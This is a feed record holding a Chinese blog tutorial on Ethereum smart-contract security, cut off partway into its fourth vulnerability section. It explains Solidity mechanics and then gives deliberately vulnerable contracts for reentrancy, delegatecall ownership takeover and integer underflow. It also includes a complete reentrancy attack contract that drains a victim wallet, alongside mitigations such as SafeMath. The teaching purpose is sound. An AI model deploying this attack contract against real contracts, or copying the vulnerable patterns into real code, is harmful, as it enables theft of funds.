{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-09-07 05:00:12","updatedTime":"2020-09-07 05:00:12","title":"以太坊智能合约安全入门了解一下","link":"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/","description":"<p>最近区块链漏洞不要太火，什么交易所用户被钓鱼导致 APIKEY 泄漏，代币合约出现整数溢出漏洞致使代币归零， MyEtherWallet 遭 DNS 劫持致使用户 ETH 被盗等等。频频爆出的区块链安全事件，越来越多的安全从业者将目标转到了 Blockchain 上。经过一段时间的恶补，让我从以太坊智能合约 “青铜I段” 升到了 “青铜III段”，本文将从以太坊智能合约的一些特殊机制说起，详细地剖析已发现各种漏洞类型，对每一种漏洞类型都会提供一段简单的合约代码来对漏洞成因和攻击方法进行说明。</p> \n<p>在阅读接下来的文章内容之前，我假定你已经对以太坊智能合约的相关概念已经有了一定的了解。如果从开发者的角度来看智能，大概是这个样子：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/1.png\" alt=\"\" /></p> \n<p>以太坊专门提供了一种叫 EVM 的虚拟机供合约代码运行，同时也提供了面向合约的语言来加快开发者开发合约，像官方推荐且用的最多的 Solidity 是一种语法类似 JavaScript 的合约开发语言。开发者按一定的业务逻辑编写合约代码，并将其部署到以太坊上，代码根据业务逻辑将数据记录在链上。以太坊其实就是一个应用生态平台，借助智能合约我们可以开发出各式各样的应用发布到以太坊上供业务直接使用。关于以太坊/智能合约的概念可参考<a href=\"http://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html\" target=\"_blank\" rel=\"noopener\">文档</a>。</p> \n<p>接下来也是以 Solidity 为例来说明以太坊智能合约的一些已存在安全问题。</p> \n<h3 id=\"I-智能合约开发-Solidity\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#I-智能合约开发-Solidity\" class=\"headerlink\" title=\"I. 智能合约开发 - Solidity\"></a>I. 智能合约开发 - Solidity</h3> \n<p>Solidity 的语法类似 JavaSript，整体还是比较好上手，一个简单的用 Solidity 编写的合约代码如下</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/2.png\" alt=\"\" /></p> \n<p>语法相关的话我建议可以先看一下这个<a href=\"https://www.youtube.com/playlist?list=PLUMwusiHZZhpf8ItZBkR95ekkMGNKvuNR\" target=\"_blank\" rel=\"noopener\">教学系列</a>（FQ），下面我说说我在学习和复习以太坊智能合约时一开始比较懵逼的地方：</p> \n<h4 id=\"1-以太坊账户和智能合约区别\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#1-以太坊账户和智能合约区别\" class=\"headerlink\" title=\"1. 以太坊账户和智能合约区别\"></a>1. 以太坊账户和智能合约区别</h4> \n<p>以太坊账户分两种，外部账户和合约账户。外部账户由一对公私钥进行管理，账户包含着 Ether 的余额，而合约账户除了可以含有 Ether 余额外，还拥有一段特定的代码，预先设定代码逻辑在外部账户或其他合约对其合约地址发送消息或发生交易时被调用和处理：</p> \n<p><strong>外部账户 EOA</strong></p> \n<ul> \n <li>由公私钥对控制</li> \n <li>拥有 ether 余额</li> \n <li>可以发送交易（transactions）</li> \n <li>不包含相关执行代码</li> \n</ul> \n<p><strong>合约账户</strong></p> \n<ul> \n <li>拥有 ether 余额</li> \n <li>含有执行代码</li> \n <li>代码仅在该合约地址发生交易或者收到其他合约发送的信息时才会被执行</li> \n <li>拥有自己的独立存储状态，且可以调用其他合约</li> \n</ul> \n<p>（这里留一个问题：“合约账户也有公私钥对吗？若有，那么允许直接用公私钥对控制账户以太坊余额吗？”）</p> \n<p>简单来说就是合约账户由外部账户或合约代码逻辑进行创建，一旦部署成功，只能按照预先写好的合约逻辑进行业务交互，不存在其他方式直接操作合约账户或更改已部署的合约代码。</p> \n<h4 id=\"2-代码执行限制\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#2-代码执行限制\" class=\"headerlink\" title=\"2. 代码执行限制\"></a>2. 代码执行限制</h4> \n<p>在初识 Solidity 时需要注意的一些代码执行限制：</p> \n<p>以太坊在设置时为了防止合约代码出现像 “死循环” 这样的情况，添加了代码执行消耗这一概念。合约代码部署到以太坊平台后，EVM 在执行这些代码时，每一步执行都会消耗一定 Gas，Gas 可以被看作是能量，一段代码逻辑可以假设为一套 “组合技”，而外部调用者在调用该合约的某一函数时会提供数量一定的 Gas，如果这些 Gas 大于这一套 “组合技” 所需的能量，则会成功执行，否则会由于 Gas 不足而发生 <code>out of gas</code> 的异常，合约状态回滚。</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/4.png\" alt=\"\" /></p> \n<p>同时在 Solidity 中，函数中递归调用栈（深度）不能超过 1024 层：</p> \n<figure class=\"highlight javascript\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\">contract Some {</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Loop</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">        Loop();</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Loop() -&gt;</span></span><br><span class=\"line\"><span class=\"comment\">// Loop() -&gt;</span></span><br><span class=\"line\"><span class=\"comment\">// Loop() -&gt;</span></span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"><span class=\"comment\">// ... (must less than 1024)</span></span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"><span class=\"comment\">// Loop()</span></span><br /></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<h4 id=\"3-回退函数-fallback\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#3-回退函数-fallback\" class=\"headerlink\" title=\"3. 回退函数 - fallback()\"></a>3. 回退函数 - fallback()</h4> \n<p>在跟进 Solidity 的安全漏洞时，有很大一部分都与合约实例的回退函数有关。那什么是回退函数呢？官方文档描述到：</p> \n<blockquote> \n <p>A contract can have exactly one unnamed function. This function cannot have arguments and cannot return anything. It is executed on a call to the contract if none of the other functions match the given function identifier (or if no data was supplied at all).</p> \n</blockquote> \n<p>fallback 函数在合约实例中表现形式即为一个不带参数没有返回值的匿名函数：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/3.png\" alt=\"\" /></p> \n<p>那么什么时候会执行 fallback 函数呢？</p> \n<ol> \n <li>当外部账户或其他合约向该合约地址发送 ether 时；</li> \n <li>当外部账户或其他合约调用了该合约一个<strong>不存在</strong>的函数时；</li> \n</ol> \n<p><strong>注：目前已知的关于 Solidity 的安全问题大多都会涉及到 fallback 函数</strong></p> \n<h4 id=\"4-几种转币方法对比\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#4-几种转币方法对比\" class=\"headerlink\" title=\"4. 几种转币方法对比\"></a>4. 几种转币方法对比</h4> \n<p>Solidity 中 <code>&lt;address&gt;.transfer()</code>，<code>&lt;address&gt;.send()</code> 和 <code>&lt;address&gt;.gas().call.vale()()</code> 都可以用于向某一地址发送 ether，他们的区别在于：</p> \n<p><strong>&lt;address&gt;.transfer()</strong></p> \n<ul> \n <li>当发送失败时会 <code>throw;</code> 回滚状态</li> \n <li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li> \n</ul> \n<p><strong>&lt;address&gt;.send()</strong></p> \n<ul> \n <li>当发送失败时会返回 <code>false</code> 布尔值</li> \n <li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li> \n</ul> \n<p><strong>&lt;address&gt;.gas().call.value()()</strong></p> \n<ul> \n <li>当发送失败时会返回 <code>false</code> 布尔值</li> \n <li>传递所有可用 Gas 进行调用（可通过 <code>gas(gas_value)</code> 进行限制），不能有效防止重入（reentrancy）</li> \n</ul> \n<p><strong>注：开发者需要根据不同场景合理的使用这些函数来实现转币的功能，如果考虑不周或处理不完整，则极有可能出现漏洞被攻击者利用</strong></p> \n<p>例如，早期很多合约在使用 <code>&lt;address&gt;.send()</code> 进行转帐时，都会忽略掉其返回值，从而致使当转账失败时，后续的代码流程依然会得到执行。</p> \n<h4 id=\"5-require-和-assert，revert-与-throw\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#5-require-和-assert，revert-与-throw\" class=\"headerlink\" title=\"5. require 和 assert，revert 与 throw\"></a>5. require 和 assert，revert 与 throw</h4> \n<p><code>require</code> 和 <code>assert</code> 都可用于检查条件，并在不满足条件的时候抛出异常，但在使用上 <code>require</code> 更偏向代码逻辑健壮性检查上；而在需要确认一些本不该出现的情况异常发生的时候，就需要使用 <code>assert</code> 去判断了。</p> \n<p><code>revert</code> 和 <code>throw</code> 都是标记错误并恢复当前调用，但 Solidity 在 <code>0.4.10</code> 开始引入 <code>revert()</code>, <code>assert()</code>, <code>require()</code> 函数，用法上原先的 <code>throw;</code> 等于 <code>revert()</code>。</p> \n<p>关于这几个函数详细讲解，可以参考<a href=\"https://medium.com/blockchannel/the-use-of-revert-assert-and-require-in-solidity-and-the-new-revert-opcode-in-the-evm-1a3a7990e06e\" target=\"_blank\" rel=\"noopener\">文章</a>。</p> \n<h3 id=\"II-漏洞现场还原\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#II-漏洞现场还原\" class=\"headerlink\" title=\"II. 漏洞现场还原\"></a>II. 漏洞现场还原</h3> \n<p>历史上已经出现过很多关于以太坊合约的安全事件，这些安全事件在当时的影响也是巨大的，轻则让已部署的合约无法继续运行，重则会导致数千万美元的损失。在金融领域，是不允许错误出现的，但从侧面来讲，正是这些安全事件的出现，才促使了以太坊或者说是区块链安全的发展，越来越多的人关注区块链安全、合约安全、协议安全等。</p> \n<p>所以，通过一段时间的学习，在这我将已经明白的关于以太坊合约的几个漏洞原理记录下来，有兴趣的可以进一步交流。</p> \n<p>下面列出了已知的常见的 Solidity 的漏洞类型（来自于 <a href=\"https://www.dasp.co/\" target=\"_blank\" rel=\"noopener\">DASP Top 10</a>）：</p> \n<ol> \n <li>Reentrancy - 重入</li> \n <li>Access Control - 访问控制</li> \n <li>Arithmetic Issues - 算术问题（整数上下溢出）</li> \n <li>Unchecked Return Values For Low Level Calls - 未严格判断不安全函数调用返回值</li> \n <li>Denial of Service - 拒绝服务</li> \n <li>Bad Randomness - 可预测的随机处理</li> \n <li>Front Running</li> \n <li>Time manipulation</li> \n <li>Short Address Attack - 短地址攻击</li> \n <li>Unknown Unknowns - 其他未知</li> \n</ol> \n<p>下面我会按照 <code>原理</code> -&gt; <code>示例（代码）</code> -&gt; <code>攻击</code> 来对每一类型的漏洞进行原理说明和攻击方法的讲解。</p> \n<h4 id=\"1-Reentrancy\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#1-Reentrancy\" class=\"headerlink\" title=\"1. Reentrancy\"></a>1. Reentrancy</h4> \n<p>重入漏洞，在我刚开始看这个漏洞类型的时候，还是比较懵逼的，因为从字面上来看，“重入” 其实可以简单理解成 “递归” 的意思，那么在传统的开发语言里 “递归” 调用是一种很常见的逻辑处理方式，那在 Solidity 里为什么就成了漏洞了呢。在上面一部分也有讲到，在以太坊智能合约里有一些内在的执行限制，如 Gas Limit，来看下面这段代码：</p> \n<figure class=\"highlight javascript\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract IDMoney {</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">    mapping (<span class=\"function\"><span class=\"params\">address</span> =&gt;</span> uint256) balances;  <span class=\"comment\">// 记录每个打币者存入的资产情况</span></span><br><span class=\"line\"></span><br><span class=\"line\"> event withdrawLog(address, uint256);</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">IDMoney</span>(<span class=\"params\"></span>) </span>{ owner = msg.sender; }</span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deposit</span>(<span class=\"params\"></span>) <span class=\"title\">payable</span> </span>{ balances[msg.sender] += msg.value; }</span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">withdraw</span>(<span class=\"params\">address to, uint256 amount</span>) </span>{</span><br><span class=\"line\"> <span class=\"built_in\">require</span>(balances[msg.sender] &gt; amount);</span><br><span class=\"line\"> <span class=\"built_in\">require</span>(<span class=\"keyword\">this</span>.balance &gt; amount);</span><br><span class=\"line\"></span><br><span class=\"line\"> withdrawLog(to, amount); <span class=\"comment\">// 打印日志，方便观察 reentrancy</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> to.call.value(amount)(); <span class=\"comment\">// 使用 call.value()() 进行 ether 转币时，默认会发所有的 Gas 给外部</span></span><br><span class=\"line\"> balances[msg.sender] -= amount;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">balanceOf</span>(<span class=\"params\"></span>) <span class=\"title\">returns</span> (<span class=\"params\">uint256</span>) </span>{ <span class=\"keyword\">return</span> balances[msg.sender]; }</span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">balanceOf</span>(<span class=\"params\">address addr</span>) <span class=\"title\">returns</span> (<span class=\"params\">uint256</span>) </span>{ <span class=\"keyword\">return</span> balances[addr]; }</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>这段代码是为了说明重入漏洞原理编写的，实现的是一个类似公共钱包的合约。任何人都可以向 <code>IDMoney</code> 存入相应的 Ether，合约会记录每个账户在该合约里的资产（Ether）情况，账户可以查询自身/他人在此合约中的余额，同时也能够通过 <code>withdraw</code> 将自己在合约中的 Ether 直接提取出来转给其他账户。</p> \n<p>初识以太坊智能合约的人在分析上面这段代码时，应该会认为是一段比较正常的代码逻辑，似乎并没有什么问题。但是我在之前就说了，以太坊智能合约漏洞的出现其实跟自身的语法（语言）特性有很大的关系。这里，我们把焦点放在 <code>withdraw(address, uint256)</code> 函数中，合约在进行提币时，使用 <code>require</code> 依次判断提币账户是否拥有相应的资产和该合约是否拥有足够的资金可供提币（有点类似于交易所的提币判断），随后使用 <code>to.call.value(amount)();</code> 来发送 Ether，处理完成后相应修改用户资产数据。</p> \n<p>仔细看过第一部分 I.3 的同学肯定发现了，这里转币的方法用的是 <code>call.value()()</code> 的方式，区别于 <code>send()</code> 和 <code>transfer()</code> 两个相似功能的函数，<code>call.value()()</code> 会将剩余的 Gas 全部给予外部调用（fallback 函数），而 <code>send()</code> 和 <code>transfer()</code> 只会有 <code>2300</code> 的 Gas 量来处理本次转币操作。如果在进行 Ether 交易时目标地址是个合约地址，那么默认会调用该合约的 fallback 函数（存在的情况下，不存在转币会失败，注意 payable 修饰）。</p> \n<p>上面说了这么多，显然地，在提币或者说是合约用户在转币的过程中，存在一个递归 <code>withdraw</code> 的问题（因为资产修改在转币之后），攻击者可以部署一个包含恶意递归调用的合约将公共钱包合约里的 Ether 全部提出，流程大致是这样的：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/6.png\" alt=\"\" /></p> \n<p><strong>（读者可以直接先根据上面的 <code>IDMoney</code> 合约代码写出自己的攻击合约代码，然后在测试环境中进行模拟）</strong></p> \n<p>我实现的攻击合约代码如下：</p> \n<figure class=\"highlight javascript\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\">contract Attack {</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">    address victim;</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier ownerOnly { <span class=\"built_in\">require</span>(owner == msg.sender); _; }</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Attack</span>(<span class=\"params\"></span>) <span class=\"title\">payable</span> </span>{ owner = msg.sender; }</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">// 设置已部署的 IDMoney 合约实例地址</span></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setVictim</span>(<span class=\"params\">address target</span>) <span class=\"title\">ownerOnly</span> </span>{ victim = target; }</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">// deposit Ether to IDMoney deployed</span></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">step1</span>(<span class=\"params\">uint256 amount</span>) <span class=\"title\">ownerOnly</span> <span class=\"title\">payable</span> </span>{</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.balance &gt; amount) {</span><br><span class=\"line\"> victim.call.value(amount)(bytes4(keccak256(<span class=\"string\">\"deposit()\"</span>)));</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br><span class=\"line\"> <span class=\"comment\">// withdraw Ether from IDMoney deployed</span></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">step2</span>(<span class=\"params\">uint256 amount</span>) <span class=\"title\">ownerOnly</span> </span>{</span><br><span class=\"line\"> victim.call(bytes4(keccak256(<span class=\"string\">\"withdraw(address,uint256)\"</span>)), <span class=\"keyword\">this</span>, amount);</span><br><span class=\"line\"> }</span><br><span class=\"line\"> <span class=\"comment\">// selfdestruct, send all balance to owner</span></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">stopAttack</span>(<span class=\"params\"></span>) <span class=\"title\">ownerOnly</span> </span>{</span><br><span class=\"line\"> selfdestruct(owner);</span><br><span class=\"line\"> }</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">startAttack</span>(<span class=\"params\">uint256 amount</span>) <span class=\"title\">ownerOnly</span> </span>{</span><br><span class=\"line\"> step1(amount);</span><br><span class=\"line\"> step2(amount / <span class=\"number\">2</span>);</span><br><span class=\"line\"> }</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) <span class=\"title\">payable</span> </span>{</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (msg.sender == victim) {</span><br><span class=\"line\"> <span class=\"comment\">// 再次尝试调用 IDCoin 的 sendCoin 函数，递归转币</span></span><br><span class=\"line\"> victim.call(bytes4(keccak256(<span class=\"string\">\"withdraw(address,uint256)\"</span>)), <span class=\"keyword\">this</span>, msg.value);</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>使用 <code>remix-ide</code> 模拟攻击流程：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/reentrancy_demo.gif\" alt=\"\" /></p> \n<p>著名导致以太坊硬分叉（ETH/ETC）的 <a href=\"https://blog.slock.it/the-history-of-the-dao-and-lessons-learned-d06740f8cfa5\" target=\"_blank\" rel=\"noopener\">The DAO</a> 事件就跟重入漏洞有关，该事件导致 60 多万以太坊被盗。</p> \n<h4 id=\"2-Access-Control\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#2-Access-Control\" class=\"headerlink\" title=\"2. Access Control\"></a>2. Access Control</h4> \n<p>访问控制，在使用 Solidity 编写合约代码时，有几种默认的变量或函数访问域关键字：<code>private</code>, <code>public</code>, <code>external</code> 和 <code>internal</code>，对合约实例方法来讲，默认可见状态为 <code>public</code>，而合约实例变量的默认可见状态为 <code>private</code>。</p> \n<ul> \n <li>public 标记函数或变量可以被任何账户调用或获取，可以是合约里的函数、外部用户或继承该合约里的函数</li> \n <li>external 标记的函数只能从外部访问，不能被合约里的函数直接调用，但可以使用 <code>this.func()</code> 外部调用的方式调用该函数</li> \n <li>private 标记的函数或变量只能在本合约中使用（注：这里的限制只是在代码层面，以太坊是公链，任何人都能直接从链上获取合约的状态信息）</li> \n <li>internal 一般用在合约继承中，父合约中被标记成 internal 状态变量或函数可供子合约进行直接访问和调用（外部无法直接获取和调用）</li> \n</ul> \n<p>Solidity 中除了常规的变量和函数可见性描述外，这里还需要特别提到的就是两种底层调用方式 <code>call</code> 和 <code>delegatecall</code>：</p> \n<ul> \n <li><code>call</code> 的外部调用上下文是外部合约</li> \n <li><code>delegatecall</code> 的外部调用上下是调用合约上下文</li> \n</ul> \n<p>简单的用图表示就是：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/7.png\" alt=\"\" /></p> \n<p>合约 A 以 <code>call</code> 方式调用外部合约 B 的 <code>func()</code> 函数，在外部合约 B 上下文执行完 <code>func()</code> 后继续返回 A 合约上下文继续执行；而当 A 以 <code>delegatecall</code> 方式调用时，相当于将外部合约 B 的 <code>func()</code> 代码复制过来（其函数中涉及的变量或函数都需要存在）在 A 上下文空间中执行。</p> \n<p>下面代码是 OpenZeppelin CTF 中的题目：</p> \n<figure class=\"highlight javascript\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Delegate {</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Delegate</span>(<span class=\"params\">address _owner</span>) </span>{</span><br><span class=\"line\"> owner = _owner;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pwn</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\"> owner = msg.sender;</span><br><span class=\"line\"> }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">contract Delegation {</span><br><span class=\"line\"> address public owner;</span><br><span class=\"line\"> Delegate delegate;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Delegation</span>(<span class=\"params\">address _delegateAddress</span>) </span>{</span><br><span class=\"line\"> delegate = Delegate(_delegateAddress);</span><br><span class=\"line\"> owner = msg.sender;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (delegate.delegatecall(msg.data)) {</span><br><span class=\"line\"> <span class=\"keyword\">this</span>;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> }</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>仔细分析代码，合约 Delegation 在 fallback 函数中使用 <code>msg.data</code> 对 Delegate 实例进行了 <code>delegatecall()</code> 调用。<code>msg.data</code> 可控，这里攻击者直接用 <code>bytes4(keccak256(\"pwn()\"))</code> 即可通过 <code>delegatecall()</code> 将已部署的 Delegation <code>owner</code> 修改为攻击者自己（msg.sender）。</p> \n<p>使用 <code>remix-ide</code> 模拟攻击流程：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/delegatecall_demo.gif\" alt=\"\" /></p> \n<p>2017 年下半年出现的智能合约钱包 Parity 被盗事件就跟未授权和 <code>delegatecall</code> 有关。</p> \n<h4 id=\"3-Arithmetic-Issues\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#3-Arithmetic-Issues\" class=\"headerlink\" title=\"3. Arithmetic Issues\"></a>3. Arithmetic Issues</h4> \n<p>算数问题？通常来说，在编程语言里算数问题导致的漏洞最多的就是整数溢出了，整数溢出又分为上溢和下溢。整数溢出的原理其实很简单，这里以 8 位无符整型为例，8 位整型可表示的范围为 <code>[0, 255]</code>，<code>255</code> 在内存中存储按位存储的形式为（下图左）：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/8.png\" alt=\"\" /></p> \n<p>8 位无符整数 255 在内存中占据了 8bit 位置，若再加上 1 整体会因为进位而导致整体翻转为 0，最后导致原有的 8bit 表示的整数变为 0.</p> \n<p>如果是 8 位有符整型，其可表示的范围为 <code>[-128, 127]</code>，<code>127</code> 在内存中存储按位存储的形式为（下图左）：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/9.png\" alt=\"\" /></p> \n<p>在这里因为高位作为了符号位，当 <code>127</code> 加上 1 时，由于进位符号位变为 <code>1</code>（负数），因为符号位已翻转为 <code>1</code>，通过还原此负数值，最终得到的 8 位有符整数为 <code>-128</code>。</p> \n<p>上面两个都是整数上溢的图例，同样整数下溢 <code>(uint8)0-1=(uint8)255</code>, <code>(int8)(-128)-1=(int8)127</code>。</p> \n<p>在 <code>withdraw(uint)</code> 函数中首先通过 <code>require(balances[msg.sender] - _amount &gt; 0)</code> 来确保账户有足够的余额可以提取，随后通过 <code>msg.sender.transfer(_amount)</code> 来提取 Ether，最后更新用户余额信息。这段代码若是一个没有任何安全编码经验的人来审计，代码的逻辑处理流程似乎看不出什么问题，但是如果是编码经验丰富或者说是安全研究人员来看，这里就明显存在整数溢出绕过检查的漏洞。</p> \n<p>在 Solidity 中 <code>uint</code> 默认为 256 位无符整型，可表示范围 <code>[0, 2**256-1]</code>，在上面的示例代码中通过做差的方式来判断余额，如果传入的 <code>_amount</code> 大于账户余额，则 <code>balances[msg.sender] - _amount</code> 会由于整数下溢而大于 0 绕过了条件判断，最终提取大于用户余额的 Ether，且更新后的余额可能会是一个极其大的数。</p> \n<figure class=\"highlight javascript\"> \n <table> \n  <tr> \n   <td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MyToken {</span><br><span class=\"line\">    mapping (<span class=\"function\"><span class=\"params\">address</span> =&gt;</span> uint) balances;</span><br><span class=\"line\">        </span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">balanceOf</span>(<span class=\"params\">address _user</span>) <span class=\"title\">returns</span> (<span class=\"params\">uint</span>) </span>{ <span class=\"keyword\">return</span> balances[_user]; }</span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deposit</span>(<span class=\"params\"></span>) <span class=\"title\">payable</span> </span>{ balances[msg.sender] += msg.value; }</span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">withdraw</span>(<span class=\"params\">uint _amount</span>) </span>{</span><br><span class=\"line\"> <span class=\"built_in\">require</span>(balances[msg.sender] - _amount &gt; <span class=\"number\">0</span>); <span class=\"comment\">// 存在整数溢出</span></span><br><span class=\"line\"> msg.sender.transfer(_amount);</span><br><span class=\"line\"> balances[msg.sender] -= _amount;</span><br><span class=\"line\"> }</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n  </tr> \n </table> \n</figure> \n<p>简单的利用过程演示：</p> \n<p><img src=\"http://rickgray.me/images/articles/2018-05-17-ethereum-smart-contracts-vulnerabilities-review/integer_down_overflow.gif\" alt=\"\" /></p> \n<p>为了避免上面代码造成的整数溢出，可以将条件判断改为 <code>require(balances[msg.sender] &gt; _amount)</code>，这样就不会执行算术操作进行进行逻辑判断，一定程度上避免了整数溢出的发生。</p> \n<p>Solidity 除了简单的算术操作会出现整数溢出外，还有一些需要注意的编码细节，稍不注意就可能形成整数溢出导致无法执行正常代码流程：</p> \n<ul> \n <li>数组 <code>length</code> 为 256 位无符整型，仔细对 <code>array.length++</code> 或者 <code>array.length--</code> 操作进行溢出校验；</li> \n <li>常见的循环变量 <code>for (var i = 0; i &lt; items.length; i++) ...</code> 中，<code>i</code> 为 8 位无符整型，当 <code>items</code> 长度大于 256 时，可能造成 <code>i</code> 值溢出无法遍历完全；</li> \n</ul> \n<p>关于合约整数溢出的漏洞并不少见，可以看看最近曝光的几起整数溢出事件：<a href=\"https://www.anquanke.com/post/id/145520\" target=\"_blank\" rel=\"noopener\">《代币变泡沫，以太坊Hexagon溢出漏洞比狗庄还过分》</a>，<a href=\"https://www.anquanke.com/post/id/106382\" target=\"_blank\" rel=\"noopener\">《Solidity合约中的整数安全问题——SMT/BEC合约整数溢出解析》</a></p> \n<p><strong>为了防止整数溢出的发生，一方面可以在算术逻辑前后进行验证，另一方面可以直接使用 OpenZeppelin 维护的一套智能合约函数库中的 <a href=\"https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol\" target=\"_blank\" rel=\"noopener\">SafeMath</a> 来处理算术逻辑。</strong></p> \n<h4 id=\"4-Unchecked-Return-Values-For-Low-Level-Calls\"><a href=\"http://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilities-review/#4-Unchecked-Return-Values-For-Low-Level-Calls\" class=\"headerlink\" title=\"4. Unchecked Return Values For Low Level 